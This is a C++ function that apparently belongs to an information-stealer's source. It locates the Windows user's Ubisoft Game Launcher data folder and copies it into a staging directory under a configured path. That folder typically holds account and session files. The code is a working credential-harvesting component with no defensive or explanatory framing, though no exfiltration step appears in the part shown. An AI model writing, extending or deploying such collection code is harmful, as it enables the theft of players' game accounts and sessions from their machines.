void gaming::Ubisoft()
{
	printf("Ubisoft\n");
	std::string user = func::GetUser();

	if (std::filesystem::exists("C:/Users/" + user + "/AppData/Local" + "/Ubisoft Game Launcher")) 
	{
		std::string dirs[] = {
"C:/Users/" + user + "/AppData/Local" + "/Ubisoft Game Launcher",
		};

		std::string defaultPaths[] = {

		"C:/Users/" + user + config::path + "/Games",
		"C:/Users/" + user + config::path + "/Games/Ubisoft",

		};
		
		for (size_t i = 0; i < std::size(defaultPaths); i++)
		{
			int result = _mkdir(defaultPaths[i].c_str());
		}

		try
		{
			for (size_t i = 0; i < std::size(dirs); i++)
			{

				func::copyDirectory(dirs[i], defaultPaths[1]);
			}
		}
		catch (const char* error_message)
		{
			std::cout << error_message << std::endl;
		}

	}

	
}